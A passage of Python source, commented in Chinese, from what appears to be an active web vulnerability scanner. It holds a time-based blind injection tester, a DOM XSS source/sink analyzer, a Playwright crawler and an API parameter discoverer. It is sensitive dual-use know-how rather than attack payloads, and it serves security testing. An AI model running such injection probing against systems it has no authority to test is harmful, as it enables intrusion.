                        self.session.post(url, json=params, timeout=15, allow_redirects=True)
                    else:
                        self.session.post(url, data=params, timeout=15, allow_redirects=True)
                elapsed = time.time() - start
                times.append(elapsed)
            except Exception:
                times.append(15.0)  # 超时记为15秒（表示可能有延迟）

            # 小间隔避免影响服务器
            time.sleep(0.1)

        return times

    def test_time_blind(self, url: str, method: str, normal_params: Dict,
                          injection_params: Dict, content_type: str = "form",
                          sleep_seconds: int = 3, samples: int = 3) -> Dict[str, Any]:
        """
        执行时间盲注测试。返回是否成功及统计数据。
        """
        baseline_times = self.measure_times(url, method, normal_params, content_type, samples=samples)
        test_times = self.measure_times(url, method, injection_params, content_type, samples=samples)

        baseline_mean = statistics.mean(baseline_times) if baseline_times else 0
        test_mean = statistics.mean(test_times) if test_times else 0

        baseline_std = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0.1
        test_std = statistics.stdev(test_times) if len(test_times) > 1 else 0.1

        time_diff = test_mean - baseline_mean

        # 显著性: test_mean > baseline_mean + 2 * std_dev (2σ ~ 95%置信区间)
        z_score = (test_mean - baseline_mean) / max(baseline_std, 0.01)
        is_vulnerable = (
            time_diff > (sleep_seconds * 0.5)  # 至少差一半预期
            and z_score > 2.0  # 统计显著
            and test_mean > sleep_seconds  # 实际响应时间超过 sleep 时间
        )

        result = {
            "baseline_mean": round(baseline_mean, 2),
            "test_mean": round(test_mean, 2),
            "baseline_std": round(baseline_std, 2),
            "test_std": round(test_std, 2),
            "time_diff": round(time_diff, 2),
            "z_score": round(z_score, 2),
            "is_vulnerable": is_vulnerable,
            "baseline_times": [round(t, 2) for t in baseline_times],
            "test_times": [round(t, 2) for t in test_times],
        }

        if self.logger:
            self.logger(f"[TimeBlind] baseline={result['baseline_mean']}s test={result['test_mean']}s "
                       f"diff={result['time_diff']}s z={result['z_score']} vulnerable={is_vulnerable}")

        return result



# 第九部分：JS Sink Analyzer - DOM XSS 静态分析 + Source/Sink 追踪


class JsSinkAnalyzer:
    """
    JavaScript Sink 分析器 - 静态分析 DOM XSS 风险
    - 扫描页面中所有内联/外链 JS
    - 识别危险 Sink：innerHTML / eval / document.write / setTimeout / Function 等
    - 识别 Source：location.search / location.hash / document.URL 等用户可控输入
    - 尝试建立 Source → Sink 数据流关联
    """

    # 危险 Sink 定义（sink 名称 → 风险等级 → 说明）
    DANGEROUS_SINKS = {
        "innerHTML": {"severity": "high", "desc": "直接写入 HTML，可执行任意脚本"},
        "outerHTML": {"severity": "high", "desc": "直接写入 HTML，可执行任意脚本"},
        "document.write": {"severity": "high", "desc": "直接写入文档流，可执行脚本"},
        "document.writeln": {"severity": "high", "desc": "直接写入文档流，可执行脚本"},
        "eval": {"severity": "critical", "desc": "直接执行任意 JavaScript 代码"},
        "setTimeout": {"severity": "high", "desc": "第一个参数为字符串时会被当作 JS 执行"},
        "setInterval": {"severity": "high", "desc": "第一个参数为字符串时会被当作 JS 执行"},
        "Function(": {"severity": "critical", "desc": "动态构造并执行函数"},
        "new Function": {"severity": "critical", "desc": "动态构造并执行函数"},
        "location.href": {"severity": "medium", "desc": "可导致跳转钓鱼或 javascript: 协议执行"},
        "location.replace": {"severity": "medium", "desc": "可导致跳转钓鱼"},
        "location.assign": {"severity": "medium", "desc": "可导致跳转钓鱼"},
        "window.open": {"severity": "medium", "desc": "可弹窗或执行 javascript: 协议"},
        "setAttribute": {"severity": "medium", "desc": "设置 href/src/on* 等属性时可能触发 XSS"},
        "insertAdjacentHTML": {"severity": "high", "desc": "插入 HTML 到指定位置，可执行脚本"},
    }

    # 用户可控 Source
    USER_SOURCES = {
        "location.search": "URL 查询字符串",
        "location.hash": "URL 哈希片段",
        "location.href": "完整 URL",
        "location.pathname": "URL 路径",
        "document.URL": "当前页面 URL",
        "document.documentURI": "文档 URI",
        "document.referrer": "来源页面 URL",
        "document.cookie": "Cookie 值",
        "window.name": "窗口名称",
        "localStorage": "本地存储",
        "sessionStorage": "会话存储",
        "navigator.userAgent": "用户代理",
        "document.baseURI": "基础 URI",
        "history.state": "历史状态",
    }

    def __init__(self, logger=None):
        self.logger = logger

    def log(self, msg: str):
        if self.logger:
            self.logger(msg)

    def analyze_page(self, html_content: str, url: str = "") -> List[Dict[str, Any]]:
        """
        分析页面中的 DOM XSS 风险点
        返回: [ {sink, source, line, severity, evidence, confidence} ... ]
        """
        findings = []

        if not html_content:
            return findings

        # 提取所有 JS 代码
        inline_scripts = self._extract_inline_scripts(html_content)
        event_handlers = self._extract_event_handlers(html_content)
        javascript_hrefs = self._extract_javascript_hrefs(html_content)

        self.log(f"[JSSink] 发现 {len(inline_scripts)} 个内联脚本块, "
                 f"{len(event_handlers)} 个事件处理器, "
                 f"{len(javascript_hrefs)} 个 javascript: 链接")

        # 分析每个脚本块
        for idx, script in enumerate(inline_scripts):
            script_findings = self._analyze_js_code(script, url, f"inline_script_{idx}")
            findings.extend(script_findings)

        # 分析事件处理器
        for handler in event_handlers:
            handler_findings = self._analyze_js_code(
                handler["code"], url,
                f"event_{handler['event']}_{handler.get('attr_name', '?')}",
                is_event=True
            )
            findings.extend(handler_findings)

        # 分析 javascript: href
        for href in javascript_hrefs:
            href_findings = self._analyze_js_code(
                href["code"], url,
                f"href_javascript",
                is_javascript_url=True
            )
            findings.extend(href_findings)

        # 去重 + 按严重程度排序
        unique = self._deduplicate_findings(findings)
        unique.sort(key=lambda x: {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(x.get("severity", "low"), 4))

        return unique

    def _extract_inline_scripts(self, html: str) -> List[str]:
        """提取所有内联 <script> 代码"""
        scripts = []
        pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.IGNORECASE | re.DOTALL)
        for m in pattern.finditer(html):
            code = m.group(1).strip()
            if code:
                scripts.append(code)
        return scripts

    def _extract_event_handlers(self, html: str) -> List[Dict]:
        """提取所有事件处理器（onclick=、onerror= 等）"""
        handlers = []
        pattern = re.compile(
            r'\bon([a-z]+)\s*=\s*(["\'])(.*?)\2',
            re.IGNORECASE | re.DOTALL
        )
        for m in pattern.finditer(html):
            event = m.group(1).lower()
            code = m.group(3).strip()
            if code and len(code) > 2:
                handlers.append({"event": event, "code": code, "attr_name": event})
        return handlers

    def _extract_javascript_hrefs(self, html: str) -> List[Dict]:
        """提取 javascript: 协议链接"""
        hrefs = []
        pattern = re.compile(
            r'(?:href|src|action|data)\s*=\s*(["\'])(javascript:[^\'"]+)\1',
            re.IGNORECASE
        )
        for m in pattern.finditer(html):
            code = m.group(2).strip()
            if code:
                hrefs.append({"code": code, "url": code})
        return hrefs

    def _analyze_js_code(self, code: str, url: str, context: str,
                          is_event: bool = False, is_javascript_url: bool = False) -> List[Dict]:
        """分析单个 JS 代码块的 DOM XSS 风险"""
        findings = []

        if not code or len(code) < 3:
            return findings

        # 1. 检测所有 Sink 出现
        sinks_found = self._find_sinks(code)
        if not sinks_found:
            return findings

        # 2. 检测所有 Source 出现
        sources_found = self._find_sources(code)

        # 3. 检查 Source → Sink 关联
        for sink_info in sinks_found:
            sink_name = sink_info["name"]
            sink_line = sink_info.get("line", 0)
            sink_meta = self.DANGEROUS_SINKS.get(sink_name, {"severity": "medium", "desc": ""})

            # 检查同一个变量或表达式中是否存在 Source
            # 简化判断：同一行内有 source 有 sink → 高度可疑
            evidence = sink_info.get("snippet", sink_name)
            has_source_in_sink = self._has_source_near_sink(code, sink_info, sources_found)

            if has_source_in_sink and sources_found:
                # 高置信度：source 和 sink 在同一段代码中
                confidence = 0.7 if self._check_direct_flow(code, sink_info, sources_found) else 0.4
                findings.append({
                    "type": "dom_xss",
                    "sink": sink_name,
                    "sources": [s["name"] for s in sources_found[:3]],
                    "severity": sink_meta["severity"],
                    "confidence": confidence,
                    "evidence": evidence[:200],
                    "context": context,
                    "description": f"潜在 DOM XSS: {sink_name} 可能接收用户可控输入 ({sink_meta['desc']})",
                })
            elif is_event or is_javascript_url:
                # 事件处理器或 javascript: URL，即使用户可控性不明确也算中风险
                findings.append({
                    "type": "dom_xss_candidate",
                    "sink": sink_name,
                    "sources": [],
                    "severity": "low",
                    "confidence": 0.3,
                    "evidence": evidence[:200],
                    "context": context,
                    "description": f"事件处理器中使用 {sink_name}，需结合动态分析确认",
                })

        return findings

    def _find_sinks(self, code: str) -> List[Dict]:
        """查找代码中的危险 sink"""
        sinks = []
        lines = code.split("\n")

        for line_no, line in enumerate(lines, 1):
            line_stripped = line.strip()
            if not line_stripped:
                continue

            for sink_name in self.DANGEROUS_SINKS:
                if sink_name in line:
                    # 确保是函数调用或属性赋值（非注释）
                    if line_stripped.startswith("//") or line_stripped.startswith("/*"):
                        continue
                    sinks.append({
                        "name": sink_name,
                        "line": line_no,
                        "snippet": line_stripped[:200],
                    })
                    break  # 一行只记录一次

        return sinks

    def _find_sources(self, code: str) -> List[Dict]:
        """查找代码中的用户可控 source"""
        sources = []
        lines = code.split("\n")

        for line_no, line in enumerate(lines, 1):
            line_stripped = line.strip()
            if not line_stripped or line_stripped.startswith("//"):
                continue

            for src_name, src_desc in self.USER_SOURCES.items():
                if src_name in line:
                    sources.append({
                        "name": src_name,
                        "line": line_no,
                        "desc": src_desc,
                        "snippet": line_stripped[:200],
                    })
                    break

        return sources

    def _has_source_near_sink(self, code: str, sink_info: Dict, sources: List[Dict]) -> bool:
        """检查 sink 附近是否有 source（简化判断：同一代码块内有 source）"""
        if not sources:
            return False

        sink_line = sink_info.get("line", 0)

        # 简单规则：同一代码块内（10行以内）有 source → 算有关联
        for src in sources:
            if abs(src.get("line", 0) - sink_line) <= 10:
                return True

        # 或者：source 被赋值给某个变量，sink 使用了同名变量
        # （简化版：检查是否存在 x = location.search 然后 sink(x) 模式）
        src_var_pattern = re.compile(
            r'(?:var|let|const)\s+(\w+)\s*=\s*(?:location\.|document\.)',
            re.IGNORECASE
        )
        src_vars = src_var_pattern.findall(code)

        if src_vars:
            for var_name in src_vars:
                # 检查 sink 行是否包含该变量
                if var_name in sink_info.get("snippet", ""):
                    return True

        return False

    def _check_direct_flow(self, code: str, sink_info: Dict, sources: List[Dict]) -> bool:
        """检查是否有直接的数据流（source → 变量 → sink）"""
        snippet = sink_info.get("snippet", "")

        # 直接模式：innerHTML = location.search
        for src in sources:
            src_name = src["name"]
            if src_name in snippet:
                return True

        # 间接模式：x = location.search; ... innerHTML = x;
        # 通过变量名匹配
        assignment_pattern = re.compile(r'(\w+)\s*=\s*(?:location\.|document\.|window\.)', re.IGNORECASE)
        tainted_vars = assignment_pattern.findall(code)

        for var in tainted_vars:
            if re.search(r'\b' + re.escape(var) + r'\b', snippet):
                return True

        return False

    def _deduplicate_findings(self, findings: List[Dict]) -> List[Dict]:
        """去重"""
        seen = set()
        unique = []
        for f in findings:
            key = f.get("sink", "") + "|" + f.get("context", "") + "|" + f.get("evidence", "")[:50]
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique



# 第十部分：BrowserCrawler - 浏览器爬虫 + 自动交互


class BrowserCrawler:
    """
    Playwright 浏览器爬虫 - 自动交互发现动态内容
    - 自动点击按钮/链接，触发 SPA 路由切换
    - 发现动态加载的表单和端点
    - 保持登录状态 / Cookie 同步
    - 收集所有访问过的 URL 和 DOM 状态
    """

    # 感兴趣的元素选择器
    CLICKABLE_SELECTORS = [
        "button",
        "a[href]",
        "[onclick]",
        "[role='button']",
        ".btn",
        ".button",
        "[data-toggle]",
        "[data-action]",
        "input[type='submit']",
        "input[type='button']",
    ]

    # 跳过的链接/按钮关键词
    SKIP_KEYWORDS = [
        "logout", "signout", "exit", "quit",
        "javascript:void(0)", "javascript:;",
        "#",
    ]

    def __init__(self, logger=None, max_pages: int = 20, max_depth: int = 2):
        self.logger = logger
        self.max_pages = max_pages
        self.max_depth = max_depth
        self.visited_urls = set()
        self.discovered_forms = []
        self.discovered_endpoints = []
        self.discovered_urls = []
        self._page = None
        self._context = None
        self._browser = None

    def log(self, msg: str):
        if self.logger:
            self.logger(msg)

    def set_browser(self, browser):
        """设置外部浏览器实例（复用 ActiveScanner 的浏览器）"""
        self._browser = browser

    def crawl(self, start_url: str, base_domain: str, cookies: List[Dict] = None) -> Dict[str, Any]:
        """
        从 start_url 开始爬取（使用 Playwright）
        返回: {visited_urls, discovered_forms, discovered_endpoints, discovered_urls}
        """
        if not self._browser:
            self.log("[BrowserCrawler] 无浏览器实例，跳过动态爬取")
            return {
                "visited_urls": [],
                "discovered_forms": [],
                "discovered_endpoints": [],
                "discovered_urls": [],
            }

        result = {
            "visited_urls": [],
            "discovered_forms": [],
            "discovered_endpoints": [],
            "discovered_urls": [],
        }

        try:
            # 创建新上下文
            self._context = self._browser.new_context(
                viewport={"width": 1280, "height": 800},
                user_agent="Mozilla/5.0 AI-Safe-Crawler/2.0",
            )

            # 注入 cookie
            if cookies:
                try:
                    self._context.add_cookies(cookies)
                except Exception:
                    pass

            self._page = self._context.new_page()

            # 开始 BFS 爬取
            queue = [(start_url, 0)]
            visited = set()

            while queue and len(visited) < self.max_pages:
                url, depth = queue.pop(0)

                if url in visited:
                    continue
                if depth > self.max_depth:
                    continue

                # 只爬同域
                try:
                    from urllib.parse import urlparse
                    p = urlparse(url)
                    if p.netloc != base_domain:
                        continue
                except Exception:
                    continue

                visited.add(url)
                result["visited_urls"].append(url)
                self.log(f"[BrowserCrawler] 访问 [{depth}/{self.max_depth}]: {url[:80]}")

                try:
                    self._page.goto(url, timeout=15000, wait_until="domcontentloaded")
                    self._page.wait_for_timeout(1000)  # 等待动态内容
                except Exception as e:
                    self.log(f"[BrowserCrawler] 访问失败: {e}")
                    continue

                # 收集页面信息
                page_info = self._analyze_page(url, depth)
                result["discovered_forms"].extend(page_info["forms"])
                result["discovered_endpoints"].extend(page_info["endpoints"])
                result["discovered_urls"].extend(page_info["links"])

                # 发现链接，加入队列
                for link in page_info["links"]:
                    if link not in visited and len(visited) + len(queue) < self.max_pages:
                        queue.append((link, depth + 1))

                # 尝试交互点击（发现动态内容）
                if depth < self.max_depth:
                    new_pages = self._try_interactions(url, depth)
                    for np_url in new_pages:
                        if np_url not in visited and len(visited) + len(queue) < self.max_pages:
                            queue.append((np_url, depth + 1))

                if not self._check_running():
                    break

            self._context.close()
            self._context = None
            self._page = None

        except Exception as e:
            self.log(f"[BrowserCrawler] 异常: {e}")

        # 去重
        result["discovered_urls"] = list(set(result["discovered_urls"]))
        result["discovered_endpoints"] = list(set(result["discovered_endpoints"]))

        self.log(f"[BrowserCrawler] 完成: 访问 {len(result['visited_urls'])} 页, "
                 f"发现 {len(result['discovered_forms'])} 表单, "
                 f"{len(result['discovered_endpoints'])} API端点, "
                 f"{len(result['discovered_urls'])} URL")

        return result

    def _analyze_page(self, url: str, depth: int) -> Dict[str, Any]:
        """分析当前页面，提取链接/表单/API端点"""
        forms = []
        endpoints = []
        links = []

        try:
            # 提取所有链接
            link_elements = self._page.query_selector_all("a[href]")
            for el in link_elements:
                try:
                    href = el.get_attribute("href") or ""
                    if href and self._is_valid_link(href, url):
                        full_url = self._resolve_url(href, url)
                        if full_url and full_url not in links:
                            links.append(full_url)
                except Exception:
                    pass

            # 提取表单
            form_elements = self._page.query_selector_all("form")
            for form in form_elements:
                try:
                    form_info = self._extract_form_info(form, url)
                    if form_info:
                        forms.append(form_info)
                except Exception:
                    pass

            # 从页面 JS 中提取 API 端点
            try:
                content = self._page.content()
                api_patterns = [
                    r'["\'](/api/[a-zA-Z0-9_/\-]+)["\']',
                    r'["\'](/v\d+/[a-zA-Z0-9_/\-]+)["\']',
                    r'fetch\(["\']([^"\']+)["\']',
                    r'axios\.(?:get|post|put|delete|patch)\(["\']([^"\']+)["\']',
                    r'url:\s*["\']([^"\']+)["\']',
                ]
                for pat in api_patterns:
                    for m in re.finditer(pat, content):
                        ep = m.group(1)
                        if ep and len(ep) > 5:
                            full_ep = self._resolve_url(ep, url)
                            if full_ep and full_ep not in endpoints:
                                endpoints.append(full_ep)
            except Exception:
                pass

        except Exception as e:
            self.log(f"[BrowserCrawler] 页面分析异常: {e}")

        return {"forms": forms, "endpoints": endpoints, "links": links}

    def _try_interactions(self, base_url: str, depth: int) -> List[str]:
        """尝试与页面元素交互，发现动态内容"""
        new_urls = []

        try:
            # 找可点击元素
            clickables = self._page.query_selector_all(
                "button, a[href], [onclick], [role='button'], .btn, .button, input[type='submit']"
            )

            clicked_count = 0
            for el in clickables[:10]:  # 限制交互数量
                if clicked_count >= 5:
                    break

                try:
                    text = (el.inner_text() or "").strip()[:30]
                    cls = (el.get_attribute("class") or "")[:30]
                    href = el.get_attribute("href") or ""

                    # 跳过明显不需要的
                    skip = False
                    for kw in self.SKIP_KEYWORDS:
                        if kw.lower() in href.lower() or kw.lower() in text.lower():
                            skip = True
                            break
                    if skip:
                        continue

                    # 点击前记录 URL
                    old_url = self._page.url

                    # 尝试点击
                    try:
                        el.click(timeout=2000, force=True)
                        self._page.wait_for_timeout(500)
                    except Exception:
                        continue

                    new_url = self._page.url
                    if new_url != old_url and self._is_same_domain(new_url, base_url):
                        if new_url not in new_urls:
                            new_urls.append(new_url)
                            self.log(f"[BrowserCrawler] 点击发现新页面: {new_url[:80]}")

                    clicked_count += 1

                    # 返回原页面
                    try:
                        self._page.go_back(timeout=3000)
                        self._page.wait_for_timeout(300)
                    except Exception:
                        try:
                            self._page.goto(base_url, timeout=5000, wait_until="domcontentloaded")
                        except Exception:
                            pass

                except Exception:
                    continue

        except Exception as e:
            self.log(f"[BrowserCrawler] 交互异常: {e}")

        return new_urls

    def _extract_form_info(self, form_element, base_url: str) -> Optional[Dict]:
        """从 Playwright 元素提取表单信息"""
        try:
            action = form_element.get_attribute("action") or ""
            method = (form_element.get_attribute("method") or "get").lower()

            inputs = []
            input_elements = form_element.query_selector_all("input, select, textarea, button")
            for inp in input_elements:
                try:
                    inp_type = inp.get_attribute("type") or "text"
                    inp_name = inp.get_attribute("name") or ""
                    inp_value = inp.get_attribute("value") or ""
                    if inp_name:
                        inputs.append({
                            "type": inp_type,
                            "name": inp_name,
                            "value": inp_value,
                        })
                except Exception:
                    pass

            if action and inputs:
                full_action = self._resolve_url(action, base_url)
                return {
                    "action": full_action or action,
                    "method": method,
                    "inputs": inputs,
                }
        except Exception:
            pass
        return None

    def _is_valid_link(self, href: str, base_url: str) -> bool:
        """判断链接是否有效且值得爬取"""
        if not href:
            return False
        if href.startswith("#") or href.startswith("javascript:"):
            return False
        if href in ["", "/"]:
            return False
        # 跳过非页面资源
        skip_ext = [".png", ".jpg", ".jpeg", ".gif", ".css", ".js", ".ico", ".svg", ".woff", ".pdf"]
        lower_href = href.lower()
        for ext in skip_ext:
            if lower_href.endswith(ext):
                return False
        return True

    def _resolve_url(self, href: str, base_url: str) -> Optional[str]:
        """解析相对 URL 为绝对 URL"""
        try:
            from urllib.parse import urljoin, urlparse
            if href.startswith(("http://", "https://")):
                return href
            return urljoin(base_url, href)
        except Exception:
            return None

    def _is_same_domain(self, url1: str, url2: str) -> bool:
        """判断是否同域"""
        try:
            from urllib.parse import urlparse
            return urlparse(url1).netloc == urlparse(url2).netloc
        except Exception:
            return False

    def _check_running(self) -> bool:
        """检查是否应该继续运行（供子类覆盖）"""
        return True



# 第十一部分：API 参数结构推断器


class ApiParamDiscoverer:
    """
    API 参数发现与结构推断器
    - 从 JS 代码中提取 API 调用
    - 从 HTML 表单中推断参数名和类型
    - 推断 JSON 请求体结构（字段名、类型、是否必填）
    - 支持 GraphQL Schema 探测
    """

    # 常见参数名 → 推测类型映射
    PARAM_TYPE_HINTS = {
        "id": "integer",
        "user_id": "integer",
        "uid": "integer",
        "page": "integer",
        "limit": "integer",
        "size": "integer",
        "offset": "integer",
        "count": "integer",
        "name": "string",
        "username": "string",
        "email": "string",
        "password": "string",
        "token": "string",
        "key": "string",
        "search": "string",
        "query": "string",
        "keyword": "string",
        "title": "string",
        "content": "string",
        "description": "string",
        "url": "string",
        "avatar": "string",
        "phone": "string",
        "mobile": "string",
        "type": "string",
        "status": "integer",
        "enabled": "boolean",
        "active": "boolean",
        "is_admin": "boolean",
        "created_at": "string",
        "updated_at": "string",
    }

    # JSON 字段模式（从 JS 代码中提取）
    FIELD_PATTERNS = [
        r'(\w+)\s*:\s*"[^"]*"',         # key: "value"
        r'(\w+)\s*:\s*\d+',             # key: 123
        r'(\w+)\s*:\s*true',            # key: true
        r'(\w+)\s*:\s*false',           # key: false
        r'(\w+)\s*:\s*null',            # key: null
        r'(\w+)\s*:\s*\[',              # key: [ (数组)
        r'(\w+)\s*:\s*\{',              # key: { (对象)
    ]

    def __init__(self, logger=None):
        self.logger = logger

    def log(self, msg: str):
        if self.logger:
            self.logger(msg)

    def discover_from_page(self, html_content: str, base_url: str = "") -> List[Dict[str, Any]]:
        """
        从页面 HTML 中发现 API 及参数结构
        返回: [ {endpoint, method, params_type, params_example, source, confidence} ... ]
        """
        results = []

        if not html_content:
            return results

        # 1. 从表单推断
        form_params = self._discover_from_forms(html_content, base_url)
        results.extend(form_params)

        # 2. 从内联 JS 中提取
        js_params = self._discover_from_js(html_content, base_url)
        results.extend(js_params)

        # 3. 从 URL 模式中推断
        url_params = self._discover_from_urls(html_content, base_url)
        results.extend(url_params)

        # 去重
        unique = self._deduplicate(results)
        unique.sort(key=lambda x: x.get("confidence", 0), reverse=True)

        self.log(f"[ApiDiscover] 从页面发现 {len(unique)} 个 API 端点及参数结构")
        return unique

    def _discover_from_forms(self, html: str, base_url: str) -> List[Dict]:
        """从 HTML 表单推断参数"""
        results = []

        soup = BeautifulSoup(html, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            try:
                action = form.get("action", "")
                method = (form.get("method") or "get").lower()
                if not action:
                    continue

                inputs = form.find_all(["input", "select", "textarea", "button"])
                params = {}
                for inp in inputs:
                    name = inp.get("name")
                    if not name:
                        continue
                    inp_type = inp.get("type", "text")
                    value = inp.get("value", "")
                    params[name] = {
                        "type": self._guess_param_type(name, inp_type, value),
                        "example": value or self._example_for_type(name),
                        "form_type": inp_type,
                    }

                if params:
                    full_action = self._resolve_url(action, base_url)
                    results.append({
                        "endpoint": full_action or action,
                        "method": method,
                        "params_type": "form" if method != "get" else "query",
                        "params_structure": params,
                        "source": "html_form",
                        "confidence": 0.9,
                    })
            except Exception:
                continue

        return results

    def _discover_from_js(self, html: str, base_url: str) -> List[Dict]:
        """从 JS 代码中推断 API 调用和参数"""
        results = []

        # 提取 script 内容
        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.IGNORECASE | re.DOTALL)

        for m in script_pattern.finditer(html):
            code = m.group(1)
            if not code:
                continue

            # 匹配 fetch / axios 调用
            fetch_patterns = [
                (r'fetch\s*\(\s*["\']([^"\']+)["\']', "GET"),
                (r'fetch\s*\(\s*["\']([^"\']+)["\']\s*,\s*\{[^}]*method\s*:\s*["\'](POST|PUT|DELETE|PATCH)["\']', None),
                (r'axios\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']', None),
            ]

            # 提取 fetch 调用
            for fm in re.finditer(r'fetch\s*\(\s*["\']([^"\']+)["\']', code):
                url = fm.group(1)
                if not url:
                    continue

                # 尝试从附近代码中提取请求体结构
                body_struct = self._extract_body_structure(code, fm.end(), 500)
                params_type = "json" if body_struct else "query"

                full_url = self._resolve_url(url, base_url)
                results.append({
                    "endpoint": full_url or url,
                    "method": self._extract_method(code, fm.start()),
                    "params_type": params_type,
                    "params_structure": body_struct or {},
                    "source": "js_fetch",
                    "confidence": 0.6 if body_struct else 0.4,
                })

            # 提取 axios 调用
            for am in re.finditer(r'axios\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']', code):
                method = am.group(1).upper()
                url = am.group(2)
                if not url:
                    continue

                body_struct = self._extract_body_structure(code, am.end(), 500)
                params_type = "json" if (body_struct and method in ["POST", "PUT", "PATCH"]) else "query"

                full_url = self._resolve_url(url, base_url)
                results.append({
                    "endpoint": full_url or url,
                    "method": method,
                    "params_type": params_type,
                    "params_structure": body_struct or {},
                    "source": "js_axios",
                    "confidence": 0.7 if body_struct else 0.5,
                })

        return results

    def _discover_from_urls(self, html: str, base_url: str) -> List[Dict]:
        """从 URL 模式中推断 RESTful 参数"""
        results = []
        seen = set()

        # 匹配 /api/xxx/{id} 模式
        api_pattern = re.compile(r'["\'](/api/[a-zA-Z0-9_/\-]+)["\']')
        for m in api_pattern.finditer(html):
            path = m.group(1)
            if path in seen:
                continue
            seen.add(path)

            # 检查是否有路径参数
            segments = [s for s in path.split("/") if s]
            path_params = {}
            for i, seg in enumerate(segments):
                if seg.isdigit():
                    path_params[f"param_{i}"] = {"type": "integer", "example": int(seg)}

            full_url = self._resolve_url(path, base_url)
            results.append({
                "endpoint": full_url or path,
                "method": "GET",
                "params_type": "path" if path_params else "query",
                "params_structure": path_params or {},
                "source": "url_pattern",
                "confidence": 0.3,
            })

        return results

    def _extract_body_structure(self, code: str, start_pos: int, max_length: int = 500) -> Optional[Dict]:
        """从 JS 代码中提取 JSON 请求体结构"""
        try:
            snippet = code[start_pos:start_pos + max_length]

            # 匹配 body / data 后的对象字面量
            body_match = re.search(
                r'(?:body|data|params)\s*:\s*(\{[^{}]*\})',
                snippet, re.DOTALL
            )
            if not body_match:
                # 尝试找第二个参数是对象的
                body_match = re.search(
                    r',\s*(\{[^{}]*\})',
                    snippet, re.DOTALL
                )

            if body_match:
                obj_str = body_match.group(1)
                return self._parse_js_object(obj_str)

        except Exception:
            pass
        return None

    def _parse_js_object(self, obj_str: str) -> Dict:
        """简化解析 JS 对象字面量，提取字段名和值类型"""
        result = {}

        # 提取 key: value 对
        for pat in self.FIELD_PATTERNS:
            for m in re.finditer(pat, obj_str):
                key = m.group(1)
                if key.startswith("_") or len(key) > 50:
                    continue
                if key in result:
                    continue

                # 推断类型
                value_str = m.group(0)
                if 'true' in value_str or 'false' in value_str:
                    val_type = "boolean"
                    val_example = True
                elif re.search(r'\d+$', value_str):
                    val_type = "integer"
                    val_example = 1
                elif 'null' in value_str:
                    val_type = "null"
                    val_example = None
                elif '[' in value_str:
                    val_type = "array"
                    val_example = []
                elif '{' in value_str:
                    val_type = "object"
                    val_example = {}
                else:
                    val_type = "string"
                    val_example = self._example_for_type(key)

                result[key] = {
                    "type": val_type,
                    "example": val_example,
                }

        return result

    def _extract_method(self, code: str, start_pos: int) -> str:
        """从代码位置附近提取 HTTP method"""
        snippet = code[start_pos:start_pos + 300]
        method_match = re.search(r'method\s*:\s*["\'](GET|POST|PUT|DELETE|PATCH)["\']', snippet)
        if method_match:
            return method_match.group(1)

        # 默认 GET，但是看后面有没有 POST 的迹象
        if "POST" in snippet:
            return "POST"
        return "GET"

    def _guess_param_type(self, name: str, input_type: str, value: str = "") -> str:
        """根据参数名和 input 类型推测数据类型"""
        name_lower = name.lower()

        if name_lower in self.PARAM_TYPE_HINTS:
            return self.PARAM_TYPE_HINTS[name_lower]

        if input_type in ["number", "range"]:
            return "integer"
        if input_type == "checkbox":
            return "boolean"
        if input_type in ["email"]:
            return "string"
        if value and value.isdigit():
            return "integer"

        return "string"

    def _example_for_type(self, name: str) -> Any:
        """为参数名生成示例值"""
        name_lower = name.lower()

        if name_lower in self.PARAM_TYPE_HINTS:
            t = self.PARAM_TYPE_HINTS[name_lower]
            if t == "integer":
                return 1
            if t == "boolean":
                return True
            if t == "string":
                return name_lower.replace("_", "")
        return "test"

    def _resolve_url(self, href: str, base_url: str) -> Optional[str]:
        """解析相对 URL"""
        try:
            from urllib.parse import urljoin
            if href.startswith(("http://", "https://")):
                return href
            return urljoin(base_url, href)
        except Exception:
            return None

    def _deduplicate(self, items: List[Dict]) -> List[Dict]:
        """去重"""
        seen = set()
        unique = []
        for item in items:
            key = item.get("endpoint", "") + "|" + item.get("method", "") + "|" + str(item.get("params_structure", {}))[:100]
            if key not in seen:
                seen.add(key)
                unique.append(item)
        return unique



# 第十二部分：主动扫描器 - 整合所有组件


PLAYWRIGHT_TOTAL_TIMEOUT = 120  # 秒


class ActiveScanner:
    def __init__(self, logger=None, callback=None):
        self.logger = logger
        self.callback = callback
        self.running = False
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 AI-Safe-Scanner/2.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

        # 初始化子组件
        self.diff_engine = ResponseDiffEngine(logger=lambda m: self.log(m))
        self.csrf_handler = CsrfHandler(session=self.session, logger=lambda m: self.log(m))
        self.mutator = PayloadMutator()
        self.crawler = Crawler(session=self.session, logger=lambda m: self.log(m), max_depth=0, max_urls=10)
        self.request_engine = RequestEngine(session=self.session, csrf_handler=self.csrf_handler,
                                           logger=lambda m: self.log(m))
        self.analyzer = ParameterAnalyzer()
        self.time_blind = TimeBlindAnalyzer(session=self.session, logger=lambda m: self.log(m))
        self.js_sink_analyzer = JsSinkAnalyzer(logger=lambda m: self.log(m))
        self.browser_crawler = BrowserCrawler(logger=lambda m: self.log(m), max_pages=10, max_depth=1)
        self.api_discoverer = ApiParamDiscoverer(logger=lambda m: self.log(m))

        self.current_url = ""
        self.found_vulns = []
        self.scan_logs = []
        self.playwright = None
        self.browser = None


    # 日志与报告


    def log(self, msg: str):
        if self.logger:
            self.logger(msg)
        self.scan_logs.append(msg)

    def report_vuln(self, vuln_type: str, details: str, payload: str = "", confidence: str = "medium"):
        vuln = {
            "type": vuln_type,
            "details": details,
            "description": details,   # 向后兼容: GUI 用的是 description
            "payload": payload,
            "confidence": confidence,
            "url": self.current_url,
        }
        self.found_vulns.append(vuln)
        if self.callback:
            try:
                # 传字符串给 callback 避免 GUI 解析错误
                msg = f"{vuln_type} | {details} | payload={payload} | confidence={confidence}"
                self.callback(msg)
            except Exception:
                pass
